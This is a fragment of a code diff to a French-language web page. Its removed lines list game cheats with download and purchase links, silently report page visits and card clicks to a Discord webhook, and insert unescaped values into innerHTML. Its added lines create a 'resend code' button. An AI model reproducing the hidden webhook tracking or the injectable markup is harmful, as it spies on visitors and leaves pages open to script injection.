-        card.classList.remove('clicked');
-      }, 500);
-    });
-    card.addEventListener('keydown', (e) => {
-      if(e.key === 'Enter' || e.key === ' ') {
-        e.preventDefault();
-        card.classList.add('clicked');
-        sendToDiscordWebhook("Clic sur un cheat", cheat.title);
-        setTimeout(() => {
-          showDetail(cheat.id);
-          card.classList.remove('clicked');
-        }, 500);
-      }
-    });
-    return card;
-  }
-
-  function showDetail(id) {
-    const cheat = cheats.find(c => c.id === id);
-    if(!cheat) return;
-    listView.style.display = 'none';
-    detailView.style.display = 'block';
-    setTimeout(() => {
-      detailView.classList.add('visible');
-    }, 10);
-    detailView.innerHTML = `
-      <h2>${cheat.title}</h2>
-      <img src="${cheat.image}" alt="${cheat.title}" onerror="this.src='https://via.placeholder.com/400x200?text=${encodeURIComponent(cheat.title)}'">
-      <p>${cheat.description}</p>
-      <h3>Fonctionnalités :</h3>
-      <ul>
-        ${cheat.features.map(f => `<li>${f}</li>`).join('')}
-      </ul>
-      <a href="${cheat.downloadLink}" class="badge ${cheat.badge}" style="font-size:1rem; padding:10px 20px; text-decoration:none; display:inline-block; margin-top:10px;">
-        ${cheat.badgeText === 'Premium' ? '🛒 Acheter' : '🔽 Télécharger'}
-      </a>
-      <br>
-      <button id="btn-back">← Retour</button>
-    `;
-    document.getElementById('btn-back').addEventListener('click', () => {
-      detailView.classList.remove('visible');
-      setTimeout(() => {
-        detailView.style.display = 'none';
-        listView.style.display = 'flex';
-      }, 400);
-    });
-  }
-
-  // Initialisation au chargement
-  window.addEventListener('load', () => {
-    cheats.forEach(cheat => {
-      listView.appendChild(createCard(cheat));
-    });
-    sendToDiscordWebhook("Visite de la page d'accueil");
-  });
+/* ===== RESEND ===== */
+let cd=0;
+resend.onclick=()=>{
+  if(cd) return;
+  cd=30;
+  resend.textContent="Renvoyer (30s)";
+  let t=setInterval(()=>{
+    cd--;
+    resend.textContent=`Renvoyer (${cd}s)`;
+    if(!cd){clearInterval(t);resend.textContent="Renvoyer le code";}
+  },1000);
+};
 </script>
+
 </body>
 </html>
